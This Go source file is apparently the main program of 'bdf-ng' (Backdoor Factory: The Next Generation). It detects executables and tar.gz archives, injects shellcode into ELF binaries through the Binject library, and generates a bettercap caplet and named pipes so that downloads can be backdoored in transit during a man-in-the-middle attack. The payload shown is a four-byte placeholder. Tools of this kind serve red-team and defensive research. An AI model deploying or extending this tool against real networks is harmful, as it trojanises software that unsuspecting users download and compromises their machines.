package main

import (
	"archive/tar"
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"runtime"

	"github.com/akamensky/argparse"
	"github.com/mholt/archiver"

	"github.com/Binject/binjection/bj"
	"github.com/h2non/filetype"
)

func main() {
	dir, err := os.Getwd()
	if err != nil {
		log.Fatal(err)
	}
	parser := argparse.NewParser("bdf-ng", "Backdoor Factory: The Next Generation")
	cwd := parser.String("d", "cwd", &argparse.Options{Required: false,
		Default: dir, Help: "Working Directory"})
	testfile := parser.String("s", "sc", &argparse.Options{Required: true,
		Help: "File to inject (oneshot test mode)"})
	outfile := parser.String("o", "out", &argparse.Options{Required: false,
		Help: "Output file (oneshot test mode)"})
	if err := parser.Parse(os.Args); err != nil {
		log.Println(parser.Usage(err))
		return
	}
	if *outfile == "" {
		*outfile = *testfile + ".b"
	}

	if *testfile != "" { // One-shot test mode
		f, err := os.Open(*testfile)
		if err != nil {
			log.Fatal(err)
		}
		dry, err := ioutil.ReadAll(f)
		if err != nil {
			log.Fatal(err)
		}
		wet, err := Inject(dry)
		if err != nil {
			log.Fatal(err)
		}
		err = ioutil.WriteFile(*outfile, wet, 0755)
		if err != nil {
			log.Fatal(err)
		}
		return
	}

	pipeName := ""
	if runtime.GOOS == "windows" {
		pipeName = `\\.\pipe\` + "bdf"
	} else {
		pipeName = filepath.Join(*cwd, "bdf")
	}
	dryPipe := pipeName + "dry"
	wetPipe := pipeName + "wet"
	capletPath := filepath.Join(*cwd, "binject.cap")

	if err := GenerateCaplet(capletPath); err != nil {
		log.Fatal(err)
	}
	if err := GenerateCapletScript(filepath.Join(*cwd, "binject.js"), CapletScriptConfig{DryPipe: dryPipe, WetPipe: wetPipe}); err != nil {
		log.Fatal(err)
	}

	log.Printf("RUN THIS COMMAND in another terminal:\n\tbettercap -caplet %s\n", capletPath)

	go ListenPipeDry(dryPipe)
	ListenPipeWet(wetPipe)
}

// Inject a binary or archive
func Inject(dry []byte) (wet []byte, err error) {

	config := &bj.BinjectConfig{CodeCaveMode: false}

	kind, _ := filetype.Match(dry)
	if kind == filetype.Unknown || kind.MIME.Type != "application" {
		return dry, nil // unknown type or non-application type (archives are application type also), pass it on
	}
	fmt.Printf("File type: %s. MIME: %s %s %s\n", kind.Extension, kind.MIME.Type, kind.MIME.Subtype, kind.MIME.Value)

	switch kind.MIME.Subtype {
	case "gzip":
		bb := bytes.NewBuffer(nil)
		z := archiver.DefaultTarGz
		/*
			z := archiver.TarGz{
				CompressionLevel: flate.DefaultCompression,
			}
		*/
		z.CompressionLevel = 9

		err = z.Create(bb)
		if err != nil {
			return nil, err
		}
		defer z.Close()

		if err := Walk(z, dry, func(f archiver.File) error {

			log.Printf("%T %+v\n", f.Header, f.Header)

			zfh, ok := f.Header.(*tar.Header)
			if ok {
				fmt.Printf("zfh: %+v\n", zfh)

				// get file's name for the inside of the archive
				info := zfh.FileInfo()
				/*
					internalName, err := archiver.NameInArchive(info, zfh.Name, zfh.Name)
					if err != nil {
						fmt.Println(err)
						return err
					}
					fmt.Printf("internalName: %+v\n", internalName)
				*/
				// write it to the archive
				err = z.Write(archiver.File{
					FileInfo: archiver.FileInfo{
						FileInfo:   info,
						CustomName: zfh.Name,
					},
					ReadCloser: f.ReadCloser,
				})
				if err != nil {
					fmt.Println("inside walk:", err)
					//return err
					log.Fatal()
				}
			}
			return nil
		}); err != nil {
			fmt.Println("outer walk:", err)
		} else {
			return bb.Bytes(), nil
		}

	case "x-executable":
		return bj.Binject(dry, []byte{0, 0, 0, 0}, config)
	}

	return dry, nil // default to doing nothing
}

// Walk calls walkFn for each visited item in archive.
func Walk(t archiver.Reader, archive []byte, walkFn archiver.WalkFunc) error {

	file := bytes.NewBuffer(archive)
	if err := t.Open(file, 0); err != nil {
		return fmt.Errorf("opening archive: %v", err)
	}
	defer t.Close()

	for {
		f, err := t.Read()
		if err == io.EOF {
			break
		}
		if err != nil {
			return fmt.Errorf("opening next file: %v", err)
		}
		err = walkFn(f)
		if err != nil {
			fmt.Errorf("walking %s: %v", f.Name(), err)
			return nil
		}
	}

	return nil
}
